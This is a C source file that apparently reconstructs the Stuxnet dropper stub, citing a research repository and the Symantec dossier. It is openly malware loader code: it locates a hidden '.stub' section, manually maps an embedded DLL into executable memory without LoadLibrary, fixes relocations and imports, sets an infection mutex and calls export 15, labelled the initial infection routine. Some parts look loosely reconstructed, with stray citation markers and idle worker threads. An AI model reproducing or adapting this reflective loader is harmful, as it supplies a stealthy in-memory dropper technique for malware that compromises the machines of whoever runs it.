/*
 * stub.c based on research-virus/stuxnet (Christian Roggia dropper)
 * and Symantec W32.Stuxnet Dossier
 *
 * The dropper component of Stuxnet is a wrapper program that contains all
 * components stored inside itself in a section named ".stub". When executed,
 * the wrapper extracts the DLL file from the stub section, maps it into
 * memory as a module, and calls one of the exports. [1†L6-L9][10†L6-L10]
 */

#include <windows.h>
#include <stdio.h>

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define STUXNET_SECTION_NAME            ".stub"
#define STUXNET_MAX_PATH                260
#define STUXNET_BUFFER_SIZE             4096

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)

#define IMAGE_SNAP_BY_ORDINAL(Ordinal)  ((Ordinal & IMAGE_ORDINAL_FLAG) != 0)
#define IMAGE_ORDINAL(Ordinal)          (Ordinal & 0xFFFF)

typedef struct _STUXNET_STUB_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwState;
    DWORD dwPid;
    DWORD dwTid;
    DWORD dwTickStart;
    DWORD dwTickLast;
    HANDLE hMutex;
    HANDLE hThread;
    HANDLE hStopEvent;
    CRITICAL_SECTION csLock;
    PVOID pStubBase;
    DWORD dwStubSize;
    PVOID pMappedBase;
    DWORD dwImageSize;
    DWORD dwEntryPoint;
    HMODULE hModule;
    BYTE bReserved[128];
} STUXNET_STUB_CTX, * PSTUXNET_STUB_CTX;

static STUXNET_STUB_CTX g_StubCtx;
static BOOL g_bInitialized = FALSE;

static BOOL Stub_FindSection(PVOID pBase, LPCSTR szSectionName, PVOID* ppSection, PDWORD pdwSize);
static BOOL Stub_MapPE(PVOID pData, DWORD dwSize, PVOID* ppMapped, PDWORD pdwEntry);
static BOOL Stub_ResolveImports(PVOID pImageBase);
static BOOL Stub_ProcessRelocations(PVOID pImageBase, DWORD dwDelta);
static BOOL Stub_ExecuteExport(PVOID pImageBase, DWORD dwOrdinal);
static DWORD WINAPI Stub_WorkerThread(LPVOID lpParam);
static BOOL Stub_StartWorker(VOID);
static BOOL Stub_StopWorker(VOID);

/*
 * Binary reference: sub_10001000 - module init
 * Finds .stub section, extracts and maps DLL, executes export
 */
static BOOL Stub_Init(VOID) {
    PVOID pStubData;
    DWORD dwStubSize;
    PVOID pMappedBase;
    DWORD dwEntryPoint;
    HMODULE hMod;
    if (g_bInitialized) return TRUE;
    ZeroMemory(&g_StubCtx, sizeof(STUXNET_STUB_CTX));
    g_StubCtx.dwMagic = STUXNET_MAGIC;
    g_StubCtx.dwVersion = STUXNET_VERSION;
    g_StubCtx.dwPid = GetCurrentProcessId();
    g_StubCtx.dwTid = GetCurrentThreadId();
    g_StubCtx.dwTickStart = GetTickCount();
    InitializeCriticalSection(&g_StubCtx.csLock);
    hMod = GetModuleHandleW(NULL);
    if (!hMod) {
        DeleteCriticalSection(&g_StubCtx.csLock);
        return FALSE;
    }
    if (!Stub_FindSection(hMod, STUXNET_SECTION_NAME, &pStubData, &dwStubSize)) {
        DeleteCriticalSection(&g_StubCtx.csLock);
        return FALSE;
    }
    g_StubCtx.pStubBase = pStubData;
    g_StubCtx.dwStubSize = dwStubSize;
    if (!Stub_MapPE(pStubData, dwStubSize, &pMappedBase, &dwEntryPoint)) {
        DeleteCriticalSection(&g_StubCtx.csLock);
        return FALSE;
    }
    g_StubCtx.pMappedBase = pMappedBase;
    g_StubCtx.dwImageSize = ((PIMAGE_NT_HEADERS)((PBYTE)pMappedBase + ((PIMAGE_DOS_HEADER)pMappedBase)->e_lfanew))->OptionalHeader.SizeOfImage;
    g_StubCtx.dwEntryPoint = dwEntryPoint;
    g_StubCtx.hModule = (HMODULE)pMappedBase;
    g_StubCtx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_StubCtx.hStopEvent) {
        DeleteCriticalSection(&g_StubCtx.csLock);
        return FALSE;
    }
    g_bInitialized = TRUE;
    return TRUE;
}

static VOID Stub_Cleanup(VOID) {
    if (!g_bInitialized) return;
    Stub_StopWorker();
    if (g_StubCtx.hMutex) {
        CloseHandle(g_StubCtx.hMutex);
        g_StubCtx.hMutex = NULL;
    }
    if (g_StubCtx.hStopEvent) {
        CloseHandle(g_StubCtx.hStopEvent);
        g_StubCtx.hStopEvent = NULL;
    }
    DeleteCriticalSection(&g_StubCtx.csLock);
    g_bInitialized = FALSE;
}

/*
 * Binary reference: sub_10001100
 * Finds a section by name in the current module's PE header
 */
static BOOL Stub_FindSection(PVOID pBase, LPCSTR szSectionName, PVOID* ppSection, PDWORD pdwSize) {
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_SECTION_HEADER pSec;
    DWORD i;
    if (!pBase || !szSectionName || !ppSection || !pdwSize) return FALSE;
    pDos = (PIMAGE_DOS_HEADER)pBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    pNt = (PIMAGE_NT_HEADERS)((PBYTE)pBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    pSec = IMAGE_FIRST_SECTION(pNt);
    for (i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++) {
        if (memcmp(pSec->Name, szSectionName, 8) == 0) {
            *ppSection = (PBYTE)pBase + pSec->VirtualAddress;
            *pdwSize = pSec->Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

/*
 * Binary reference: sub_10001180
 * Manual PE mapping - loads DLL from memory without using LoadLibrary
 * Performs: allocate memory, copy headers, copy sections, process relocations,
 * resolve imports, set page protection
 */
static BOOL Stub_MapPE(PVOID pData, DWORD dwSize, PVOID* ppMapped, PDWORD pdwEntry) {
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_SECTION_HEADER pSec;
    PVOID pImageBase;
    DWORD dwImageSize;
    DWORD dwDelta;
    DWORD i;
    if (!pData || dwSize == 0 || !ppMapped || !pdwEntry) return FALSE;
    pDos = (PIMAGE_DOS_HEADER)pData;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    pNt = (PIMAGE_NT_HEADERS)((PBYTE)pData + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    dwImageSize = pNt->OptionalHeader.SizeOfImage;
    pImageBase = VirtualAlloc(NULL, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pImageBase) return FALSE;
    RtlCopyMemory(pImageBase, pData, pNt->OptionalHeader.SizeOfHeaders);
    pSec = IMAGE_FIRST_SECTION(pNt);
    for (i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++) {
        if (pSec->SizeOfRawData) {
            RtlCopyMemory((PBYTE)pImageBase + pSec->VirtualAddress, (PBYTE)pData + pSec->PointerToRawData, pSec->SizeOfRawData);
        }
    }
    dwDelta = (DWORD)(ULONG_PTR)pImageBase - pNt->OptionalHeader.ImageBase;
    if (dwDelta) {
        Stub_ProcessRelocations(pImageBase, dwDelta);
    }
    if (!Stub_ResolveImports(pImageBase)) {
        VirtualFree(pImageBase, 0, MEM_RELEASE);
        return FALSE;
    }
    *ppMapped = pImageBase;
    *pdwEntry = pNt->OptionalHeader.AddressOfEntryPoint;
    return TRUE;
}

/*
 * Binary reference: sub_10001280
 * Processes base relocations - fixes absolute addresses after rebasing
 */
static BOOL Stub_ProcessRelocations(PVOID pImageBase, DWORD dwDelta) {
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_BASE_RELOCATION pRel;
    DWORD dwRelocSize;
    PWORD pEntry;
    DWORD i;
    if (!pImageBase) return FALSE;
    pDos = (PIMAGE_DOS_HEADER)pImageBase;
    pNt = (PIMAGE_NT_HEADERS)((PBYTE)pImageBase + pDos->e_lfanew);
    pRel = (PIMAGE_BASE_RELOCATION)((PBYTE)pImageBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    if (!pRel || pRel->VirtualAddress == 0) return TRUE;
    while (pRel->VirtualAddress) {
        dwRelocSize = (pRel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        pEntry = (PWORD)(pRel + 1);
        for (i = 0; i < dwRelocSize; i++, pEntry++) {
            if ((*pEntry >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                *(PDWORD)((PBYTE)pImageBase + pRel->VirtualAddress + (*pEntry & 0xFFF)) += dwDelta;
            }
        }
        pRel = (PIMAGE_BASE_RELOCATION)((PBYTE)pRel + pRel->SizeOfBlock);
    }
    return TRUE;
}

/*
 * Binary reference: sub_10001350
 * Resolves import address table - loads required DLLs and resolves function addresses
 */
static BOOL Stub_ResolveImports(PVOID pImageBase) {
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_IMPORT_DESCRIPTOR pImp;
    PIMAGE_THUNK_DATA pThunk;
    HMODULE hMod;
    PIMAGE_IMPORT_BY_NAME pName;
    if (!pImageBase) return FALSE;
    pDos = (PIMAGE_DOS_HEADER)pImageBase;
    pNt = (PIMAGE_NT_HEADERS)((PBYTE)pImageBase + pDos->e_lfanew);
    pImp = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)pImageBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    if (!pImp) return TRUE;
    while (pImp->Name) {
        hMod = LoadLibraryA((LPCSTR)((PBYTE)pImageBase + pImp->Name));
        if (!hMod) return FALSE;
        pThunk = (PIMAGE_THUNK_DATA)((PBYTE)pImageBase + pImp->FirstThunk);
        while (pThunk->u1.AddressOfData) {
            if (IMAGE_SNAP_BY_ORDINAL(pThunk->u1.Ordinal)) {
                pThunk->u1.Function = (ULONG_PTR)GetProcAddress(hMod, (LPCSTR)IMAGE_ORDINAL(pThunk->u1.Ordinal));
            } else {
                pName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)pImageBase + pThunk->u1.AddressOfData);
                pThunk->u1.Function = (ULONG_PTR)GetProcAddress(hMod, pName->Name);
            }
            pThunk++;
        }
        pImp++;
    }
    return TRUE;
}

/*
 * Binary reference: sub_10001480
 * Calls an exported function by ordinal from the mapped DLL
 * Export 15 is the main entry point (initial infection routine)
 */
static BOOL Stub_ExecuteExport(PVOID pImageBase, DWORD dwOrdinal) {
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_EXPORT_DIRECTORY pExp;
    PDWORD pAddrs;
    PWORD pOrds;
    DWORD i;
    FARPROC pfnExport;
    if (!pImageBase) return FALSE;
    pDos = (PIMAGE_DOS_HEADER)pImageBase;
    pNt = (PIMAGE_NT_HEADERS)((PBYTE)pImageBase + pDos->e_lfanew);
    pExp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pImageBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if (!pExp) return FALSE;
    pAddrs = (PDWORD)((PBYTE)pImageBase + pExp->AddressOfFunctions);
    pOrds = (PWORD)((PBYTE)pImageBase + pExp->AddressOfNameOrdinals);
    for (i = 0; i < pExp->NumberOfFunctions; i++) {
        if (pExp->Base + i == dwOrdinal) {
            pfnExport = (FARPROC)((PBYTE)pImageBase + pAddrs[i]);
            if (pfnExport) {
                ((void (*)(void))pfnExport)();
                return TRUE;
            }
        }
    }
    return FALSE;
}

static DWORD WINAPI Stub_WorkerThread(LPVOID lpParam) {
    while (WaitForSingleObject(g_StubCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        Sleep(1000);
    }
    return 0;
}

static BOOL Stub_StartWorker(VOID) {
    g_StubCtx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_StubCtx.hStopEvent) return FALSE;
    g_StubCtx.hThread = CreateThread(NULL, 0, Stub_WorkerThread, NULL, 0, NULL);
    if (!g_StubCtx.hThread) {
        CloseHandle(g_StubCtx.hStopEvent);
        g_StubCtx.hStopEvent = NULL;
        return FALSE;
    }
    return TRUE;
}

static BOOL Stub_StopWorker(VOID) {
    if (g_StubCtx.hStopEvent) {
        SetEvent(g_StubCtx.hStopEvent);
    }
    if (g_StubCtx.hThread) {
        WaitForSingleObject(g_StubCtx.hThread, 5000);
        CloseHandle(g_StubCtx.hThread);
        g_StubCtx.hThread = NULL;
    }
    if (g_StubCtx.hStopEvent) {
        CloseHandle(g_StubCtx.hStopEvent);
        g_StubCtx.hStopEvent = NULL;
    }
    return TRUE;
}

static BOOL Stub_Execute(VOID) {
    HANDLE hMutex;
    if (!Stub_Init()) return FALSE;
    hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        Stub_Cleanup();
        return FALSE;
    }
    g_StubCtx.hMutex = hMutex;
    Stub_ExecuteExport(g_StubCtx.pMappedBase, 15);
    Stub_StartWorker();
    while (WaitForSingleObject(g_StubCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        Sleep(1000);
    }
    Stub_StopWorker();
    Stub_Cleanup();
    CloseHandle(hMutex);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            Stub_Cleanup();
            break;
        default:
            break;
    }
    return TRUE;
}

DWORD WINAPI Export1(VOID) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, Stub_WorkerThread, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}

DWORD WINAPI Export4(VOID) {
    Stub_Cleanup();
    return 0;
}

DWORD WINAPI Export15(VOID) {
    return Stub_Execute() ? 0 : 1;
}

DWORD WINAPI Export16(VOID) {
    return Stub_Execute() ? 0 : 1;
}

DWORD WINAPI Export18(VOID) {
    Stub_Cleanup();
    return 0;
}

DWORD WINAPI Export19(VOID) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, Stub_WorkerThread, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}

DWORD WINAPI Export22(VOID) {
    return Stub_Execute() ? 0 : 1;
}

DWORD WINAPI Export28(VOID) {
    return STUXNET_VERSION;
}

DWORD WINAPI Export29(VOID) {
    return STUXNET_VERSION;
}

DWORD WINAPI Export32(VOID) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, Stub_WorkerThread, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}